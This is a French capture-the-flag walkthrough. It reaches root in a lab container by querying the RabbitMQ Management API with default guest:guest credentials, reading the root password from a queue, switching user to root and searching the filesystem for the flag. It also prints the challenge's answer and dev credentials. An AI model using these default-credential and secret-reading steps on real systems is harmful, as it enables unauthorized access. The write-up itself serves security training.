# Résolution du challenge — Alicia au pays des miracles

Ce document décrit la résolution depuis le début, avec les commandes à exécuter et le rôle de chacune.

> Les commandes ci-dessous supposent que le service RabbitMQ Management écoute dans le conteneur du challenge sur `127.0.0.1:15672`, que le vhost est `/` et que la file recherchée s'appelle `root`.

## 1. Se connecter au challenge en SSH

Depuis ta machine, utilise l'adresse et le port SSH fournis par la plateforme CTF :

```bash
ssh -p <PORT_SSH> alicia@<ADRESSE_DU_SERVEUR>
```

Dans la configuration de développement fournie, l'utilisateur indiqué est `alicia` et le mot de passe est `miracle`. Les identifiants réellement utilisables sont ceux configurés pour l'instance déployée.

Vérifier l'identité et les permissions :

```bash
whoami
id
```

## 2. Vérifier que l'API HTTP de RabbitMQ répond

```bash
curl -sS -u guest:guest \
  http://127.0.0.1:15672/api/overview
```

RabbitMQ crée généralement un utilisateur par défaut `guest` avec le mot de passe `guest`. Par défaut, cet utilisateur est limité aux connexions locales. Ici, la requête vise `127.0.0.1` depuis le conteneur lui-même, ce qui explique l'utilisation de `guest:guest`.

Si cette commande renvoie `401 Unauthorized`, l'authentification n'est pas acceptée. Si elle renvoie `Connection refused`, l'API Management n'écoute pas à cette adresse ou le service n'est pas disponible.

## 3. Lister les files d'attente du vhost `/`

```bash
curl -sS -u guest:guest \
  'http://127.0.0.1:15672/api/queues/%2F'
```

`%2F` est l'encodage URL du nom de vhost `/`. Dans la réponse JSON, repérer la file appelée `root`.

Pour afficher les noms des files avec Python 3, si disponible :

```bash
curl -sS -u guest:guest \
  'http://127.0.0.1:15672/api/queues/%2F' \
  | python3 -c 'import json,sys; [print(q["name"], "messages=", q.get("messages"), "ready=", q.get("messages_ready")) for q in json.load(sys.stdin)]'
```

## 4. Consulter les informations de la file `root`

```bash
curl -sS -u guest:guest \
  'http://127.0.0.1:15672/api/queues/%2F/root'
```

Cette réponse donne notamment le nombre de messages dans la file. Si RabbitMQ renvoie `queue_not_found`, la file `root` n'existe pas dans ce vhost sur cette instance : vérifie que l'image et le script d'entrée du challenge ont bien été reconstruits et redéployés.

## 5. Lire la payload de la file sans la retirer

```bash
curl -sS -u guest:guest \
  -H 'content-type: application/json' \
  -X POST \
  'http://127.0.0.1:15672/api/queues/%2F/root/get' \
  -d '{"count":5,"ackmode":"ack_requeue_true","encoding":"auto","truncate":50000}'
```

La réponse est un tableau JSON. Le champ `payload` contient le texte du message. Le paramètre `ackmode: ack_requeue_true` demande à RabbitMQ de remettre les messages lus dans la file, ce qui évite de les consommer définitivement.

Pour afficher seulement les valeurs du champ `payload` (nécessite Python 3) :

```bash
curl -sS -u guest:guest \
  -H 'content-type: application/json' \
  -X POST \
  'http://127.0.0.1:15672/api/queues/%2F/root/get' \
  -d '{"count":5,"ackmode":"ack_requeue_true","encoding":"auto","truncate":50000}' \
  | python3 -c 'import json,sys; [print(m.get("payload", "")) for m in json.load(sys.stdin)]'
```

La payload configurée pour ce challenge est :

```text
IsItARootPasswordISee???
```

## 6. Utiliser la payload comme mot de passe root

Quitter éventuellement le shell courant, puis, depuis le shell `alicia`, lancer :

```bash
su - root
```

Lorsque le mot de passe est demandé, saisir :

```text
IsItARootPasswordISee???
```

Vérifier que le changement d'utilisateur a réussi :

```bash
whoami
id
```

La commande `whoami` doit afficher `root` si l'élévation de privilèges a réussi.

## 7. Rechercher le flag

Commencer par examiner le répertoire root :

```bash
ls -la /root
find /root -maxdepth 3 -type f -print 2>/dev/null
```

Rechercher ensuite les fichiers dont le nom contient `flag` :

```bash
find / -type f -iname '*flag*' 2>/dev/null
```

Pour rechercher une chaîne de flag typique dans les emplacements courants :

```bash
grep -R --binary-files=without-match -n 'CYBN{' \
  /root /home /opt /var 2>/dev/null
```

Lire le fichier identifié avec `cat`, par exemple :

```bash
cat /chemin/du/fichier_trouvé
```

Remplacer `/chemin/du/fichier_trouvé` par le chemin réellement obtenu avec `find` ou `grep`.

## 8. Dépannage rapide

### L'API ne répond pas

```bash
curl -i -u guest:guest http://127.0.0.1:15672/api/overview
```

Vérifier que RabbitMQ est démarré et que le plugin Management est activé dans l'image du challenge.

### La file `root` est introuvable

```bash
curl -sS -u guest:guest 'http://127.0.0.1:15672/api/queues/%2F'
curl -sS -u guest:guest 'http://127.0.0.1:15672/api/queues/%2F/root'
```

Confirmer que la file est créée dans le vhost `/` et que le conteneur exécute la version attendue de `entrypoint.sh`.

### La lecture renvoie un tableau vide

La file existe mais ne contient alors aucun message prêt à être lu. Vérifier les journaux du conteneur et que la fonction d'initialisation publie bien la payload après avoir créé la file.

---

## Référence technique

Ces commandes utilisent l'API HTTP de RabbitMQ : `GET /api/overview`, `GET /api/queues/%2F`, `GET /api/queues/%2F/root` et `POST /api/queues/%2F/root/get`. Documentation : <https://www.rabbitmq.com/docs/http-api-reference>.
